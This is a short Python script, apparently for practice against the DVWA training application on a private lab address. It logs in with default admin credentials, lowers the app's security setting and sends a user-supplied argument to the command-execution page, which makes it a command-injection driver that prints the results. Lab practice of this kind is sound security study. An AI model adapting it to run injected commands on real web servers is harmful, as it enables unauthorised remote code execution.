#!/usr/bin/env python

import requests,re,sys
from bs4 import BeautifulSoup

s = requests.Session()

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url,params)
    print("Logged In.")
dvwa_login()

def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'low','seclev_submit':'Submit'}
    r = s.post(url,params)
    print("Security set to Low.\n")
dvwa_security()

def cmd_exec():
    url = 'http://192.168.210.130/dvwa/vulnerabilities/exec/#'
    arg = sys.argv[1]
    params = {'ip':arg,'submit':'submit'}
    r = s.post(url,params)
    html = r.text
    soup = BeautifulSoup(html,'lxml')
    print(soup.pre.text)
cmd_exec()
#For printing only 'id' value use following:
'''
https://stackoverflow.com/questions/2557808/search-and-get-a-line-in-python
    item = re.findall('uid.*$',soup.pre.text,re.MULTILINE)
    print(soup.pre.text)
        for id in item:
            print(id)
'''

